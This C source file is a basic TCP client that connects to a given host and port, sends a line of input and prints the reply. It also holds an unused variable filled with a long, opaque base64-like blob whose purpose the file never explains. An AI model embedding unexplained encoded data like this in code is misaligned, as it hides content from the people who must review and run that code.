#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[])
{
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[256];
    char __buf_clnt[] = "P8RXM2t4O+oGcA+AwC3uQpMDAchN+/s+4DefJgnNqZFVrLICv09+DuEC/GVlFmIhVEfR0sVx6XYVOKx0BCl6HmZnW4b65L878otUZLSky5r4hz7Bb4oyE5YK9FQ4k9xQhphnOayJ/0F+10jMJw9oBAh61KEw48p3kMftVBirkbzYgEJmRNYrGi36BXXi63hA5gk77QNV82shDOyd/2EXSszahlj9/4+ffPTP/xelpyOwC3KjQfA0vnwdxJCk+D8GH4kZzyG53KzGjnXxH1opPdq165Ov/g8lqLB39kdZd7Pps80GEZj7nhanr44LW/tDs3IWLsFYkLk0mHSRLR8ItMxDTWJvj3gV+qzqkAP9igYr3Ytp6e/mQ6c5c2Kz7NOn/WQAL5iFJ+0Y1vrsrXPoyrGlhMai4z7REtPpRoWxFgvc1Y8DSY38OeskGv6Q16n6UvQV/tIjsf6OMjBprfPdKiiif6KjF0oT8JDDkg5n/tc3ZJoA0ml9KmYSTJjU35GhZ3HYO1OS6QPf5T4m0pzsGye4UrkBQXCAuEzCaXTdli16RfvxfZc7KJwaj0UeQzw0GRIt1AeCcYfV6Ii7oNrARB6WxVS4N9XMojnWyc3xngbXKoAx3bLWaMjaI8yKsWYbnfYoLrX3hqnZPE2MLYOOmPbp5OD1B6r3q54QWLZ9aDU=";
    if (argc < 3) {
       fprintf(stderr,"usage %s hostname port\n", argv[0]);
       exit(0);
    }
    portno = atoi(argv[2]);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");
    server = gethostbyname(argv[1]);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, 
         (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");
    printf("Please enter the message: ");
    bzero(buffer,256);
    fgets(buffer,255,stdin);
    n = write(sockfd,buffer,strlen(buffer));
    if (n < 0) 
         error("ERROR writing to socket");
    bzero(buffer,256);
    n = read(sockfd,buffer,255);
    if (n < 0) 
         error("ERROR reading from socket");
    printf("%s\n",buffer);
    close(sockfd);
    return 0;
}
